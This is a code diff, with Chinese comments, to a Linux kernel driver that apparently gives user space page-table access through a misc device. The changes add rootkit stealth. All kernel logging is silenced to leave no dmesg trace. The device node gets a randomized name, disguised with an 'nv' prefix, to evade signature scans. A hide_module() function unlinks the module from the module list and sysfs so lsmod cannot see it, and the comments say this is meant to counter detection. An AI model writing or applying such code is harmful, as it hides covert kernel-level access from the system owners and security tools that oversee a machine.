@@ -59,24 +59,39 @@
 #define DEV_NAME_PREFIX "nv"   /* nondescript prefix（伪装成常见驱动缩写） */
 #define DEV_NAME_LEN    8
 #define TAG             "[nv]"
+/* 无痕日志：静默所有内核日志，避免 dmesg 残留特征。
+ * 需在所有 pr_* 宏使用之前生效，故放在 include 之后、首个使用点之前。 */
+#undef pr_info
+#undef pr_warn
+#undef pr_err
+#undef pr_debug
+#undef pr_notice
+#undef printk
+#define pr_info(fmt, ...)    do { } while (0)
+#define pr_warn(fmt, ...)    do { } while (0)
+#define pr_err(fmt, ...)     do { } while (0)
+#define pr_debug(fmt, ...)   do { } while (0)
+#define pr_notice(fmt, ...)  do { } while (0)
+#define printk(fmt, ...)     do { } while (0)
 /* 运行时随机节点名 buffer */
 static char dev_node_name[DEV_NAME_LEN + 1];
 static bool dev_name_ready = false;
 
 /*
- * 生成随机节点名：前缀 + 随机 hex（每次 insmod 不同，避免固定特征被扫到）
+ * 生成随机节点名：混合小写字母+数字（非纯hex，规避"8位hex"特征扫描），
+ * 每次 insmod 不同，伪装成普通系统设备命名。
  */
 static void rand_dev_name(void)
 {
-    static const char hex[] = "0123456789abcdef";
-    u8 rnd[4];
+    /* base32 风格字符集（去掉 0/O/1/I/l 等易混淆字符），半随机更自然 */
+    static const char set[] = "abcdefghjkmnpqrstuvwxyz23456789";
+    u8 rnd[8];
     int i;
 
     dev_node_name[0] = '\0';
     get_random_bytes(rnd, sizeof(rnd));
-    for (i = 0; i < sizeof(rnd); i++) {
-        dev_node_name[i * 2]     = hex[rnd[i] & 0xf];
-        dev_node_name[i * 2 + 1] = hex[(rnd[i] >> 4) & 0xf];
+    for (i = 0; i < DEV_NAME_LEN; i++) {
+        dev_node_name[i] = set[rnd[i] % (sizeof(set) - 1)];
     }
     dev_node_name[DEV_NAME_LEN] = '\0';
     dev_name_ready = true;
@@ -1258,20 +1273,44 @@ static inline void driver_flush_tlb_user(struct vm_area_struct *vma,
 
 /* ==================== 模块 init/exit ==================== */
 
+static bool module_hidden = false;
+
+/*
+ * 隐藏模块：从内核 modules 链表与 sysfs 中摘除，使
+ *   - lsmod / /proc/modules  看不到
+ *   - /sys/module/<name>     看不到
+ * 但 misc 设备节点(file_operations)仍有效，因此用户态 open+ioctl 不受影响。
+ * 注意：隐藏后 rmmod 无法再通过模块名卸载（需驱动自身注销或重启恢复）。
+ */
+static void hide_module(void)
+{
+    struct module *mod = THIS_MODULE;
+
+    if (module_hidden)
+        return;
+
+    /* 摘除 /sys/module/<name> 的 kobject 表示 */
+    if (mod->mkobj.kobj.parent) {
+        kobject_del(&mod->mkobj.kobj);
+        kobject_put(&mod->mkobj.kobj);
+    }
+
+    /* 摘除 kernel modules 链表节点：lsmod、/proc/modules 即不可见 */
+    list_del_init(&mod->list);
+
+    /* 置标志，防重复摘除 */
+    module_hidden = true;
+}
+
 static int __init pte_driver_init(void)
 {
     int ret;
-
-    pr_info(TAG "Initializing PTE Tracking Driver...\n");
-    pr_info(TAG "Kernel version: %s\n", UTS_RELEASE);
-    pr_info(TAG "PAGE_SIZE=%lu\n", PAGE_SIZE);
 
     /* 初始化追踪链表 */
     INIT_LIST_HEAD(&track_list);
 
     /* 生成随机节点名（每次 insmod 不同，避免固定设备节点特征） */
     rand_dev_name();
-    pr_debug(TAG "node /dev/%s\n", DEVICE_NAME);
 
     /* 解析符号 */
     resolve_kallsyms();
@@ -1279,11 +1318,12 @@ static int __init pte_driver_init(void)
     /* 注册misc设备（.name 已指向随机名 buffer） */
     ret = misc_register(&misc_dev);
     if (ret) {
-        pr_warn(TAG "misc register failed: %d\n", ret);
         return ret;
     }
     misc_dev_ptr = &misc_dev;
-    pr_debug(TAG "device node m=%d\n", misc_dev.minor);
+
+    /* 注册成功后隐藏模块以对抗检测 */
+    hide_module();
 
 #ifdef PTE_ENABLE_FAULT_PROBE
     ret = register_fault_probe();
